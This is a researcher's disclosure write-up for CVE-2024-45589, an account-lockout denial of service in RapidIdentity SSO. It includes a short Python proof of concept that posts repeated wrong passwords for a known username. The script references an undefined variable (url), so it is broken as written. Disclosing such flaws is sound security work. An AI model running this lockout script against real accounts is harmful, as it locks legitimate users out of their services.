# Writeup for CVE-2024-45589 (RidLocker)

#### By Ben Rogozinski

<hr>

## Summary

#### Product vendor:
Identity Automation ([https://www.identityautomation.com/](https://www.identityautomation.com/))

#### Impacted versions:
- Rapididentity LTS <= 2023.0.2
- Rapididentity Cloud <= 2024.08.0

#### Description:
RapidIdentity LTS through 2023.0.2 and Cloud through 2024.08.0 improperly restricts excessive authentication attempts, allowing a remote attacker to cause a denial of service to legitimate users by knowing the usernames of the users they wish to target.

## First encounter

The premise for this exploit was discovered unintentionally. My school district (redacted for privacy reasons) uses Rapididentity for SSO and I noticed that after forgetting my password and inputting the wrong one a few times I could no longer log into my account even with the correct password on any of my devices for a significant period of time. I have a lot of experience with programming so I realized this was a massive oversight, as could potentially allow any remote unauthenticated user, with only the username of a target, to effectively lock users out of their accounts. With continuous use, this could also potentially last for much longer than the default lockout time.

## Research

After realizing the potentially devestating effect that this oversight could have on users, I decided to do some more research. After some quick Google searching, I came across the documentation for the API used for authentication in Rapididentity, as well as documentation its default configuration. To my surprise, I found that the default configuration required only 3 incorrect login attempts to lock an account, and that instead of a device-specific lockout, it locked the account globally, as I originally discovered.

After some research into the Rapididentity API, I decided to obtain a copy of the server ISO and do some local testing. After a long headache of getting the server software configured and running in a virtual machine, I was able to start some tests. I first used Python to test the API endpoints I would need to use for simulating a login. After testing the API, I made a short script to simulate 3 incorrect login attempts.

```python
import requests

api_url = 'https://SERVER_DOMAIN/api/rest/authn'
username = 'TEST_USER'

# Session to persist cookies between requests
session = requests.session()

# Get the ID needed for authentication
resp_step_one = session.get(api_url)
id_token = resp_step_one.json()['id']

# POST username to server
session.post(url, json={
    'id': id_token,
    'type': 'username',
    'username': username
})

# POST "passwords" to server
for _ in range(3):
    session.post(url, json={
        'id': id_token,
        'type': 'password',
        'password': 'password123'
    })
```

After running this proof of concept code above on my VM with a test account, I was met with the message ```Authentication failed```. It had worked. This proves that the login system of Rapididentity could be used by a malicious actor to deny service.

## Impact

Just by knowing the usernames of victims who use Rapididentity for authentication services, a remote attacker could effectively deny service to legitimate users. By submitting incorrect password attempts at regular intervals, this could even be extended to lock users out of their accounts for periods of time far longer than a server would be configured for in a normal scenario.

## Notes / Disclaimers

- I am **NOT** responsible for misuse of any information discussed in this writeup or the included proof of concept code. **This is for educational purposes only**.
- I have already attempted to contact Identity Automation reguarding this vulnerability several times in the last few months but have not recieved any replies.

<hr>

### Contact information
I can be reached at [ben@benrogo.net](mailto:ben@benrogo.net) for inquiries about this CVE.
